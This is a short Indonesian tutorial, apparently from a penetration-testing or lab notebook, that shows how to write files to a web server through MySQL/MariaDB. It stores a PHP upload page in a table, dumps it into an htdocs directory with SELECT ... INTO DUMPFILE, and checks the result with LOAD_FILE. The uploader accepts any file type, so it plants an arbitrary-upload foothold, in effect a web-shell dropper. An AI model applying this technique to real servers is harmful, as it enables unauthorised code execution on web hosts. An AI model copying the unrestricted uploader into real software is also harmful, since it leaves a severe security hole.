# Execute CLI Command

Pada halaman ini saya akan mencoba Execute CLI Command dari MySQL/MariaDB

## Buat table baru
```sql
CREATE TABLE `test`.`test_content` ( `id` INT NOT NULL AUTO_INCREMENT , `name` VARCHAR(50) NOT NULL , `content` TEXT NOT NULL , PRIMARY KEY (`id`)) ENGINE = InnoDB;
```

## Insert Data Baru
```sql
INSERT INTO `test_content` (`id`, `name`, `content`) VALUES (NULL, 'upload.php', '<!DOCTYPE html>
<html>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Upload Image" name="submit">
</form>

<?php

if(isset($_POST["submit"])) {
	$target_dir = getcwd()."/";
	$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
	$uploadOk = 1;
	$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

	// Check if file already exists
	if (file_exists($target_file)) {
		echo "Sorry, file already exists.";
		$uploadOk = 0;
	}
	// Check file size
	if ($_FILES["fileToUpload"]["size"] > 500000) {
		echo "Sorry, your file is too large.";
		$uploadOk = 0;
	}

	// Check if $uploadOk is set to 0 by an error
	if ($uploadOk == 0) {
		echo "Sorry, your file was not uploaded.";
	// if everything is ok, try to upload file
	} else {
		if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
			echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
		} else {
			echo "Sorry, there was an error uploading your file.";
		}
	}
}

?>

</body>
</html>');
```

## Membuat File di Disk
Jalankan query di bawah untuk membuat file `upload.php`
```sql
SELECT content FROM `test_content` WHERE 1 INTO DUMPFILE "D:/xampp2/htdocs/test/upload.php"
```
Untuk cek apakah file sudah terbentuk, jalankan perintah
```sql
SELECT LOAD_FILE('D:/xampp2/htdocs/test/upload.php') AS file_exist
```
